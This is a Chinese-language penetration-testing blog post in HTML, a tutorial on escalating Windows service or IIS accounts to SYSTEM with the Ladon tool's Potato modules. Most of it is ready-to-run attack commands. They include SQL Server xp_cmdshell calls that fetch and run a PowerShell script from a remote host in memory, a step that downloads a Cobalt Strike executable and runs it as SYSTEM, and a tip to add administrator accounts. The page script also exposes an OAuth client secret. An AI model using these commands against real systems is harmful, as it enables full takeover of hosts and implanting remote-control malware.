@@ -1,0 +1,438 @@
+<!DOCTYPE html><html lang="en"><head>
+    <!--Setting-->
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
+    <meta http-equiv="Cache-Control" content="no-siteapp">
+    <meta http-equiv="Cache-Control" content="no-transform">
+    <meta name="renderer" content="webkit|ie-comp|ie-stand">
+    <meta name="apple-mobile-web-app-capable" content="K8哥哥’s Blog">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black">
+    <meta name="format-detection" content="telephone=no,email=no,adress=no">
+    <meta name="browsermode" content="application">
+    <meta name="screen-orientation" content="portrait">
+    <meta name="theme-version" content="1.0.0">
+    <meta name="root" content="/">
+    <link rel="dns-prefetch" href="http://k8gege.org">
+    <!--SEO-->
+
+<meta name="keywords" content="LPE,EXP">
+
+
+<meta name="description" content="Ladon提权之PipePotato/BadPotato/EfsPotato/GodPotato/McpPotato/SweetPotato/PrintSpoofer
++++++++++++++...">
+
+
+<meta name="robots" content="all">
+<meta name="google" content="all">
+<meta name="googlebot" content="all">
+<meta name="verify" content="all">
+    <!--Title-->
+
+<title>
+    
+    〖教程〗Ladon渗透5个Potato提权 |
+    
+    K8哥哥’s Blog
+</title>
+
+<link rel="alternate" href="/atom.xml" title="K8哥哥’s Blog" type="application/atom+xml">
+
+
+<link rel="icon" href="/favicon.ico">
+
+    
+
+
+<link rel="stylesheet" href="/css/bootstrap.min.css?rev=3.3.7.css">
+<link rel="stylesheet" href="/css/font-awesome.min.css?rev=4.7.0.css">
+<link rel="stylesheet" href="/css/style.css?rev=@@hash.css">
+
+    
+
+
+
+    
+
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<!--[if lte IE 8]>
+<style>
+    html{ font-size: 1em }
+</style>
+<![endif]-->
+<!--[if lte IE 9]>
+<div style="ie">你使用的浏览器版本过低，为了你更好的阅读体验，请更新浏览器的版本或者使用其他现代浏览器，比如Chrome、Firefox、Safari等。</div>
+<![endif]-->
+<body>
+    <header class="main-header" style="background-image:url(
+    https://www.cnblogs.com/skins/CodingLife/images/title-yellow.png)">
+    <div class="main-header-box">
+        <a class="header-avatar" href="/" title="K8gege">
+            <img alt="logo" class="img-responsive" referrerpolicy="no-referrer" data-original="/../images/avatar.png">
+			<h3 class="K8tilte">K8哥哥</h3>
+        </a>
+        <div class="branding">
+            <!--<h2 class="text-hide">没有绝对安全的系统</h2>-->
+            
+            <h2>
+                没有绝对安全的系统
+            </h2>
+            
+        </div>
+    </div>
+	
+</header>
+    <nav class="main-navigation">
+    <div class="container">
+        <div class="row">
+            <div class="col-sm-12">
+                <div class="navbar-header"><span class="nav-toggle-button collapsed pull-right" data-toggle="collapse" data-target="#main-menu" id="mnav">
+                        <span class="sr-only"></span>
+                        <i class="fa fa-bars"></i>
+                    </span>
+                    <a class="navbar-brand" href="http://k8gege.org">
+                        K8哥哥’s Blog</a>
+                </div>
+                <div class="collapse navbar-collapse" id="main-menu">
+                    <ul class="menu">
+                        
+                        <li role="presentation" class="text-center">
+                            <a href="/"><i class="fa "></i>
+                                Home</a>
+                        </li>
+                        
+                        <li role="presentation" class="text-center">
+                            <a href="/Ladon/"><i class="fa "></i>
+                                Ladon</a>
+                        </li>
+                        
+                        <li role="presentation" class="text-center">
+                            <a href="/tags/Code/"><i class="fa "></i>
+                                Code</a>
+                        </li>
+                        
+                        <li role="presentation" class="text-center">
+                            <a href="/tags/Exp/"><i class="fa "></i>
+                                Exp</a>
+                        </li>
+                        
+                        <li role="presentation" class="text-center">
+                            <a href="/tags/Tool/"><i class="fa "></i>
+                                Tool</a>
+                        </li>
+                        
+                        <li role="presentation" class="text-center">
+                            <a href="/archives/"><i class="fa "></i>
+                                Archives</a>
+                        </li>
+                        
+                        <li role="presentation" class="text-center">
+                            <a href="/friends/"><i class="fa "></i>
+                                Friends</a>
+                        </li>
+                        
+                        <li role="presentation" class="text-center">
+                            <a href="/atom.xml"><i class="fa "></i>
+                                Rss</a>
+                        </li>
+                        
+                    </ul>
+                </div>
+            </div>
+        </div>
+    </div>
+</nav>
+    <section class="content-wrap">
+        <div class="container">
+            <div class="row">
+                <main class="col-md-8 main-content m-post">
+                    <p id="process"></p>
+<article class="post">
+    <div class="post-head">
+        <h1 id="〖教程〗Ladon渗透5个Potato提权">
+            
+            〖教程〗Ladon渗透5个Potato提权
+            
+        </h1>
+        <div class="post-meta">
+    
+    <span class="categories-meta fa-wrap">
+        <i class="fa fa-folder-open-o"></i>
+        <a class="category-link" href="/categories/Lpe/">提权</a>
+    </span>
+    
+    
+    <span class="fa-wrap">
+        <i class="fa fa-tags"></i>
+        <span class="tags-meta">
+            
+            <a class="tag-none-link" href="/tags/EXP/" rel="tag">EXP</a> <a class="tag-none-link" href="/tags/LPE/" rel="tag">LPE</a>
+            
+        </span>
+    </span>
+    
+    
+    
+    <span class="fa-wrap">
+        <i class="fa fa-clock-o"></i>
+        <span class="date-meta">
+            2023/11/20</span>
+    </span>
+    
+    <span class="fa-wrap">
+        <i class="fa fa-eye"></i>
+        <span id="busuanzi_value_page_pv"></span>
+    </span>
+    
+    
+</div>
+        
+        
+        <p class="fa fa-exclamation-triangle warning">
+            本文于<strong>
+                516</strong>
+            天之前发表
+        </p>
+        
+    </div>
+    
+    <div class="post-body post-content">
+        <h1>Ladon提权之PipePotato/BadPotato/EfsPotato/GodPotato/McpPotato/SweetPotato/PrintSpoofer</h1>
+<p>+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++</p>
+<script language="javascript" type="text/javascript">
+window.location.href="http://k8gege.org/Ladon/potato.html";
+</script>
+<p>Ladon提权之PipePotato/BadPotato/SweetPotato/PrintSpoofer</p>
+<h3 id="版本">版本</h3>
+<p>&gt;= Ladon 7.2.0<br>
+Update: 20200810</p>
+<h3 id="Potato提权原理">Potato提权原理</h3>
+<p>通过各种方法在本地NTLM中继获取SYSTEM令牌，再通过模拟令牌执行命令，通过以上方法提权统称为potato(不管是否基于原potato修改)。就像SQL注入，通过特定SQL语句注入获取特定数据库信息统称为SQL注入，而不管如何编写的SQL语句，是否基于别人的SQL语句修改。</p>
+<h3 id="提权条件">提权条件</h3>
+<p>1 本地NTLM中继获取SYSTEM令牌<br>
+2 SeImpersonatePrivilege特权</p>
+<p>测试中任意用户都可以通过本地NTLM中继获取到SYSTEM令牌权限，但是由于USER默认不开户SeImpersonatePrivilege特权，无法模拟令牌创建进程无法执行命令，所以会导致很多Potato提权失败。如下方”Win7管理员提权至SYSTEM“图片上部分就是USER部分的Potato提权失败，下方是管理员权限，而其它环境都是IIS权限。所以为了方便Ladon默认也显示当前用户SeImpersonatePrivilege特权情况。</p>
+<h3 id="SweetPotato">SweetPotato</h3>
+<p>SweetPotato集成了原版Potato和JulyPotato的功能，包含DCOM/WINRM/PrintSpoofer方法获取SYSTEM。</p>
+<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Load SweetPotato</span><br><span class="line">Local Privilege Escalation from Windows Service Accounts to SYSTEM</span><br><span class="line">Vulnerable: Win7-Win10/Win2008-2019</span><br><span class="line">Usage:</span><br><span class="line">Ladon SweetPotato cmdline</span><br></pre></td></tr></tbody></table></figure>
+<h3 id="PrintSpoofer">PrintSpoofer</h3>
+<p>pipePotato:一种新型的通用提权漏洞，PrintSpoofer是一个利用打印机PIPE提权的方法，国人写了个工具叫BadPotato。</p>
+<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Load BadPotato</span><br><span class="line">Local Privilege Escalation from Windows Service Accounts to SYSTEM</span><br><span class="line">PrintSpoofer Abusing Impersonate Privileges.</span><br><span class="line">Vulnerable: Win8-Win10/Win2012-2019</span><br><span class="line">Usage:</span><br><span class="line">Ladon BadPotato cmdline</span><br></pre></td></tr></tbody></table></figure>
+<h3 id="测试环境">测试环境</h3>
+<p>1 Win7 IIS 应用池用户权限<br>
+2 Win7 本地管理员用户权限<br>
+3 Win2012 IIS 应用池权限<br>
+4 Win7 本地服务用户权限<br>
+5 Win8 本地服务用户权限</p>
+<p>PS：由于BadPotato不支持WIN7系统，所以以上环境主要以测试SweetPotato为主。</p>
+<h4 id="Win7管理员提权至SYSTEM">Win7管理员提权至SYSTEM</h4>
+<p><img alt="使用http访问查看图片" data-original="/k8img/Ladon/exp/lpe/Win7_Admin_SweetPotato.PNG"></p>
+<h4 id="Win7-IIS应用池提权至SYSTEM">Win7 IIS应用池提权至SYSTEM</h4>
+<p><img alt="使用http访问查看图片" data-original="/k8img/Ladon/exp/lpe/IIS_Win7_SweetPotato.PNG"></p>
+<h4 id="2012-R2-IIS应用池提权至SYSTEM">2012 R2 IIS应用池提权至SYSTEM</h4>
+<p><img alt="使用http访问查看图片" data-original="/k8img/Ladon/exp/lpe/IIS8_2012_PR.PNG"></p>
+<h4 id="WIN7服务用户CS提权至SYSTEM">WIN7服务用户CS提权至SYSTEM</h4>
+<p>本地服务用户权限下直接以SYSTEM权限上控Cobalt Strike<br>
+<img alt="使用http访问查看图片" data-original="/k8img/Ladon/exp/lpe/CS_PR_SweetPotato.png"></p>
+<h4 id="WIN8服务用户提权至SYSTEM">WIN8服务用户提权至SYSTEM</h4>
+<p><img alt="使用http访问查看图片" data-original="/k8img/Ladon/exp/lpe/BadPotato.png"></p>
+<h3 id="IIS提权">IIS提权</h3>
+<p><a href="http://k8gege.org/p/6b9b3afe.html">http://k8gege.org/p/6b9b3afe.html</a></p>
+<h3 id="Ladon五个Potato提权命令">Ladon五个Potato提权命令</h3>
+<p>Ladon &gt;= 12.2</p>
+<h5 id="117-BadPotato服务用户提权至SYSTEM">117 BadPotato服务用户提权至SYSTEM</h5>
+<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Ladon BadPotato cmdline</span><br></pre></td></tr></tbody></table></figure>
+<h5 id="118-SweetPotato服务用户提权至SYSTEM">118 SweetPotato服务用户提权至SYSTEM</h5>
+<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Ladon SweetPotato cmdline</span><br></pre></td></tr></tbody></table></figure>
+<h5 id="119-EfsPotato-Win7-2019提权-服务用户权限提到system">119 EfsPotato Win7-2019提权(服务用户权限提到system)</h5>
+<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Ladon EfsPotato <span class="built_in">whoami</span></span><br></pre></td></tr></tbody></table></figure>
+<h5 id="235-Win11-2022系统提权至system权限">235 Win11/2022系统提权至system权限</h5>
+<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Ladon McpPotato <span class="built_in">whoami</span></span><br></pre></td></tr></tbody></table></figure>
+<h5 id="221-GodPotato提权Win8-Win11-Win2012-Win2022">221 GodPotato提权Win8-Win11 Win2012-Win2022</h5>
+<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Ladon GodPotato <span class="built_in">whoami</span></span><br></pre></td></tr></tbody></table></figure>
+<h5 id="190-MssqlCmd-SQL-Server数据库远程efspotato、badpotato提权">190 MssqlCmd SQL Server数据库远程efspotato、badpotato提权</h5>
+<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Ladon MssqlCmd 192.168.1.8 sa k8gege520 master install_clr</span><br><span class="line">Ladon MssqlCmd 192.168.1.8 sa k8gege520 master uninstall_clr</span><br><span class="line">Ladon MssqlCmd 192.168.1.8 sa k8gege520 master clr_exec <span class="built_in">whoami</span></span><br><span class="line">Ladon MssqlCmd 192.168.1.8 sa k8gege520 master clr_efspotato <span class="built_in">whoami</span></span><br><span class="line">Ladon MssqlCmd 192.168.1.8 sa k8gege520 master clr_badpotato <span class="built_in">whoami</span></span><br></pre></td></tr></tbody></table></figure>
+<h5 id="本地PowerShell-Ladon-Potato提权">本地PowerShell Ladon Potato提权</h5>
+<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">powershell Import-Module .\Ladon.ps1;Ladon GodPotato <span class="built_in">whoami</span></span><br><span class="line">powershell Import-Module .\Ladon.ps1;Ladon McpPotato <span class="built_in">whoami</span></span><br><span class="line">powershell Import-Module .\Ladon.ps1;Ladon EfsPotato <span class="built_in">whoami</span></span><br><span class="line">powershell Import-Module .\Ladon.ps1;Ladon SweetPotato <span class="built_in">whoami</span></span><br><span class="line">powershell Import-Module .\Ladon.ps1;Ladon BadPotato <span class="built_in">whoami</span></span><br></pre></td></tr></tbody></table></figure>
+<h5 id="远程PowerShell-Ladon-Potato提权">远程PowerShell Ladon Potato提权</h5>
+<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">powershell <span class="string">"IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.5:800/Ladon.ps1');Ladon GodPotato whoami</span></span><br><span class="line"><span class="string">powershell "</span>IEX (New-Object Net.WebClient).DownloadString(<span class="string">'http://192.168.1.5:800/Ladon.ps1'</span>);Ladon McpPotato <span class="built_in">whoami</span></span><br><span class="line">powershell <span class="string">"IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.5:800/Ladon.ps1');Ladon EfsPotato whoami</span></span><br><span class="line"><span class="string">powershell "</span>IEX (New-Object Net.WebClient).DownloadString(<span class="string">'http://192.168.1.5:800/Ladon.ps1'</span>);Ladon SweetPotato <span class="built_in">whoami</span></span><br><span class="line">powershell <span class="string">"IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.5:800/Ladon.ps1');Ladon BadPotato whoami</span></span><br></pre></td></tr></tbody></table></figure>
+<h2 id="SQL-Server数据库PowerShell-Ladon远程内存提权">SQL Server数据库PowerShell Ladon远程内存提权</h2>
+<p><a href="http://k8gege.org/Ladon/win2016_lpe_potato_bypass.html">http://k8gege.org/Ladon/win2016_lpe_potato_bypass.html</a></p>
+<h3 id="测试环境-2">测试环境</h3>
+<p>Windows Server 2016<br>
+SQL: 13.0.1601.5<br>
+Microsoft Windows [Version 10.0.14393]</p>
+<h3 id="Ladon本地用户权限提权">Ladon本地用户权限提权</h3>
+<p>网上找了些LPE，发现直接被Defender杀，病毒库更新至2021.1.19，Ladon没被杀，管理员UAC权限可通过BypassUac提权<br>
+<img alt="使用http访问查看图片" data-original="/k8img/Ladon/exp/lpe/win2016_user_lpe.png"></p>
+<h3 id="MSSQL远程加载Ladon提权">MSSQL远程加载Ladon提权</h3>
+<p>执行SQL查询权限为network service</p>
+<p><img alt="使用http访问查看图片" data-original="/k8img/Ladon/exp/lpe/sql2016_whoami.PNG"></p>
+<h4 id="远程内存加载PowerLadon提权">远程内存加载PowerLadon提权</h4>
+<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">exec</span> master..xp_cmdshell <span class="string">'powershell "IEX (New-Object Net.WebClient).DownloadString('</span><span class="string">'http://xxxxxx.800/Ladon.ps1'</span><span class="string">'); Ladon SweetPotato "whoami""'</span></span><br></pre></td></tr></tbody></table></figure>
+<p><img alt="使用http访问查看图片" data-original="/k8img/Ladon/exp/lpe/win2016_mssql2016.png"></p>
+<h4 id="ECHO写入BAT执行多行命令提权">ECHO写入BAT执行多行命令提权</h4>
+<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">exec</span> master..xp_cmdshell <span class="string">'echo whoami &gt; c:\users\public\test.bat'</span></span><br></pre></td></tr></tbody></table></figure>
+<p>可ECHO写入添加管理员用户命令或者开3389等操作（举一反三不要只懂WHOAMI）</p>
+<h4 id="使用SYSTEM权限执行BAT">使用SYSTEM权限执行BAT</h4>
+<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">exec</span> master..xp_cmdshell <span class="string">'powershell "IEX (New-Object Net.WebClient).DownloadString('</span><span class="string">'http://xxxx:800/Ladon.ps1'</span><span class="string">'); Ladon SweetPotato "c:\users\public\test.bat""'</span></span><br></pre></td></tr></tbody></table></figure>
+<h4 id="Wget下载Coblat-Strkie的EXE">Wget下载Coblat Strkie的EXE</h4>
+<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">exec</span> master..xp_cmdshell <span class="string">'powershell "IEX (New-Object Net.WebClient).DownloadString('</span><span class="string">'http://xxxx:800/Ladon.ps1'</span><span class="string">'); Ladon wget http://k8gege.org/cs.exe"'</span></span><br></pre></td></tr></tbody></table></figure>
+<h4 id="使用SYSTEM权限执行CS">使用SYSTEM权限执行CS</h4>
+<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">exec</span> master..xp_cmdshell <span class="string">'powershell "IEX (New-Object Net.WebClient).DownloadString('</span><span class="string">'http://xxxx:800/Ladon.ps1'</span><span class="string">'); Ladon SweetPotato "c:\users\public\cs.exe""'</span></span><br></pre></td></tr></tbody></table></figure>
+<h3 id="工具下载">工具下载</h3>
+<p>最新版本：<a href="http://k8gege.org/Download">http://k8gege.org/Download</a><br>
+历史版本: <a target="_blank" rel="noopener" href="https://github.com/k8gege/Ladon/releases">https://github.com/k8gege/Ladon/releases</a></p>
+<div style="text-align: center; width: 710px; border: green solid 0px;">
+<img alt="" style="display: inline-block;width: 250px;height: 300px;" data-original="http://k8gege.org/img/k8team.jpg">
+</div>
+
+    </div>
+    
+    <div class="reward" ontouchstart="">
+    <div class="reward-wrap">
+	<img height="180" width="180" data-original="../images/k8join2.png">
+
+    </div>
+    <p class="reward-tip">
+        扫码加入K8小密圈
+    </p>
+</div>
+    
+    <div class="post-footer">
+        <div>
+            
+            转载声明：
+            商业转载请联系作者获得授权,非商业转载请注明出处 © <a href="http://k8gege.org" target="_blank">K8gege</a>
+            
+            
+        </div>
+        <div>
+            
+        </div>
+    </div>
+</article>
+<div class="article-nav prev-next-wrap clearfix">
+    
+    <a href="/p/HtaSer.html" class="pre-post btn btn-default" title="Ladon渗透 HTA服务器 访问DOC执行HTA">
+        <i class="fa fa-angle-left fa-fw"></i><span class="hidden-lg">上一篇</span>
+        <span class="hidden-xs">
+            Ladon渗透 HTA服务器 访问DOC执行HTA</span>
+    </a>
+    
+    
+    <a href="/p/cve-2023-36802.html" class="next-post btn btn-default" title="〖提权〗cve-2023-36802 Win10/11/2019/2022">
+        <span class="hidden-lg">下一篇</span>
+        <span class="hidden-xs">
+            〖提权〗cve-2023-36802 Win10/11/2019/2022</span><i class="fa fa-angle-right fa-fw"></i>
+    </a>
+    
+</div>
+
+<div id="comments">
+    
+<link rel="stylesheet" href="https://cdn.bootcss.com/gitalk/1.4.1/gitalk.min.css">
+<script src="//cdn.bootcss.com/gitalk/1.4.1/gitalk.min.js"></script>
+<script src="//cdn.bootcss.com/blueimp-md5/2.9.0/js/md5.min.js"></script>
+<div id="gitalk-container"></div>
+<script type="text/javascript">
+var gitalk = new Gitalk({
+    // Gitalk配置
+    language: "en",
+    clientID: "b2247720d5b50a30fbe7",
+    clientSecret: "fbd720b7c84bea4de2ac3bef40b37509ccca0267",
+    repo: "k8gege.github.io",
+    owner: "k8gege",
+    admin: ["k8gege"],
+    id: md5(location.pathname),
+    distractionFreeMode: true
+});
+gitalk.render('gitalk-container');
+</script>
+
+</div>
+
+                </main>
+                
+                    <aside id="article-toc" role="navigation" class="col-md-4">
+    <div class="widget">
+        <h3 class="title">
+            Table of Contents
+        </h3>
+        
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-text">Ladon提权之PipePotato/BadPotato/EfsPotato/GodPotato/McpPotato/SweetPotato/PrintSpoofer</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%89%88%E6%9C%AC"><span class="toc-text">版本</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Potato%E6%8F%90%E6%9D%83%E5%8E%9F%E7%90%86"><span class="toc-text">Potato提权原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8F%90%E6%9D%83%E6%9D%A1%E4%BB%B6"><span class="toc-text">提权条件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SweetPotato"><span class="toc-text">SweetPotato</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PrintSpoofer"><span class="toc-text">PrintSpoofer</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B5%8B%E8%AF%95%E7%8E%AF%E5%A2%83"><span class="toc-text">测试环境</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Win7%E7%AE%A1%E7%90%86%E5%91%98%E6%8F%90%E6%9D%83%E8%87%B3SYSTEM"><span class="toc-text">Win7管理员提权至SYSTEM</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Win7-IIS%E5%BA%94%E7%94%A8%E6%B1%A0%E6%8F%90%E6%9D%83%E8%87%B3SYSTEM"><span class="toc-text">Win7 IIS应用池提权至SYSTEM</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2012-R2-IIS%E5%BA%94%E7%94%A8%E6%B1%A0%E6%8F%90%E6%9D%83%E8%87%B3SYSTEM"><span class="toc-text">2012 R2 IIS应用池提权至SYSTEM</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#WIN7%E6%9C%8D%E5%8A%A1%E7%94%A8%E6%88%B7CS%E6%8F%90%E6%9D%83%E8%87%B3SYSTEM"><span class="toc-text">WIN7服务用户CS提权至SYSTEM</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#WIN8%E6%9C%8D%E5%8A%A1%E7%94%A8%E6%88%B7%E6%8F%90%E6%9D%83%E8%87%B3SYSTEM"><span class="toc-text">WIN8服务用户提权至SYSTEM</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#IIS%E6%8F%90%E6%9D%83"><span class="toc-text">IIS提权</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Ladon%E4%BA%94%E4%B8%AAPotato%E6%8F%90%E6%9D%83%E5%91%BD%E4%BB%A4"><span class="toc-text">Ladon五个Potato提权命令</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#117-BadPotato%E6%9C%8D%E5%8A%A1%E7%94%A8%E6%88%B7%E6%8F%90%E6%9D%83%E8%87%B3SYSTEM"><span class="toc-text">117 BadPotato服务用户提权至SYSTEM</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#118-SweetPotato%E6%9C%8D%E5%8A%A1%E7%94%A8%E6%88%B7%E6%8F%90%E6%9D%83%E8%87%B3SYSTEM"><span class="toc-text">118 SweetPotato服务用户提权至SYSTEM</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#119-EfsPotato-Win7-2019%E6%8F%90%E6%9D%83-%E6%9C%8D%E5%8A%A1%E7%94%A8%E6%88%B7%E6%9D%83%E9%99%90%E6%8F%90%E5%88%B0system"><span class="toc-text">119 EfsPotato Win7-2019提权(服务用户权限提到system)</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#235-Win11-2022%E7%B3%BB%E7%BB%9F%E6%8F%90%E6%9D%83%E8%87%B3system%E6%9D%83%E9%99%90"><span class="toc-text">235 Win11/2022系统提权至system权限</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#221-GodPotato%E6%8F%90%E6%9D%83Win8-Win11-Win2012-Win2022"><span class="toc-text">221 GodPotato提权Win8-Win11 Win2012-Win2022</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#190-MssqlCmd-SQL-Server%E6%95%B0%E6%8D%AE%E5%BA%93%E8%BF%9C%E7%A8%8Befspotato%E3%80%81badpotato%E6%8F%90%E6%9D%83"><span class="toc-text">190 MssqlCmd SQL Server数据库远程efspotato、badpotato提权</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%9C%AC%E5%9C%B0PowerShell-Ladon-Potato%E6%8F%90%E6%9D%83"><span class="toc-text">本地PowerShell Ladon Potato提权</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%BF%9C%E7%A8%8BPowerShell-Ladon-Potato%E6%8F%90%E6%9D%83"><span class="toc-text">远程PowerShell Ladon Potato提权</span></a></li></ol></li></ol></li></ol><li class="toc-item toc-level-2"><a class="toc-link" href="#SQL-Server%E6%95%B0%E6%8D%AE%E5%BA%93PowerShell-Ladon%E8%BF%9C%E7%A8%8B%E5%86%85%E5%AD%98%E6%8F%90%E6%9D%83"><span class="toc-text">SQL Server数据库PowerShell Ladon远程内存提权</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B5%8B%E8%AF%95%E7%8E%AF%E5%A2%83-2"><span class="toc-text">测试环境</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Ladon%E6%9C%AC%E5%9C%B0%E7%94%A8%E6%88%B7%E6%9D%83%E9%99%90%E6%8F%90%E6%9D%83"><span class="toc-text">Ladon本地用户权限提权</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#MSSQL%E8%BF%9C%E7%A8%8B%E5%8A%A0%E8%BD%BDLadon%E6%8F%90%E6%9D%83"><span class="toc-text">MSSQL远程加载Ladon提权</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%BF%9C%E7%A8%8B%E5%86%85%E5%AD%98%E5%8A%A0%E8%BD%BDPowerLadon%E6%8F%90%E6%9D%83"><span class="toc-text">远程内存加载PowerLadon提权</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#ECHO%E5%86%99%E5%85%A5BAT%E6%89%A7%E8%A1%8C%E5%A4%9A%E8%A1%8C%E5%91%BD%E4%BB%A4%E6%8F%90%E6%9D%83"><span class="toc-text">ECHO写入BAT执行多行命令提权</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8SYSTEM%E6%9D%83%E9%99%90%E6%89%A7%E8%A1%8CBAT"><span class="toc-text">使用SYSTEM权限执行BAT</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Wget%E4%B8%8B%E8%BD%BDCoblat-Strkie%E7%9A%84EXE"><span class="toc-text">Wget下载Coblat Strkie的EXE</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8SYSTEM%E6%9D%83%E9%99%90%E6%89%A7%E8%A1%8CCS"><span class="toc-text">使用SYSTEM权限执行CS</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B7%A5%E5%85%B7%E4%B8%8B%E8%BD%BD"><span class="toc-text">工具下载</span></a></li></ol></li>
+        
+    </div>
+</aside>
+                
+            </div>
+        </div>
+    </section>
+    <footer class="main-footer">
+    <div class="container">
+        <div class="row">
+        </div>
+    </div>
+</footer>
+<a id="back-to-top" class="icon-btn hide">
+    <i class="fa fa-chevron-up"></i>
+</a>
+
+<script>
+var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "https://hm.baidu.com/hm.js?0f0409af9df7ad2cc43cc334b4d9b515";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+</script>
+
+ <script type="text/javascript" src="http://libs.baidu.com/jquery/1.11.1/jquery.min.js"></script>
+ <script src="https://cdn.bootcdn.net/ajax/libs/lazysizes/5.3.2/lazysizes.min.js" async=""></script>
+
+    <div class="copyright">
+    <div class="container">
+        <div class="row">
+            <div class="col-sm-12">
+                <div class="busuanzi">
+    
+    Total:
+    <strong id="busuanzi_value_site_pv">
+        <i class="fa fa-spinner fa-spin"></i>
+    </strong>
+	<!-- 
+    &nbsp; | &nbsp;
+    
+	Visitors:
+    <strong id="busuanzi_value_site_uv">
+        <i class="fa fa-spinner fa-spin"></i> 
+    </strong>
+	-->
+    
+</div>
+            </div>
+            <div class="col-sm-12">
+                <span>Copyright ©
+                    2020
+                    
+                </span> |
+                <span>
+                    Powered by <a href="//k8gege.org" class="copyright-links" target="_blank" rel="nofollow">K8gege</a>
+                </span>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+<script async="" src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+<script src="/js/app.js?rev=@@hash.js"></script>
+
+
+</body></html>
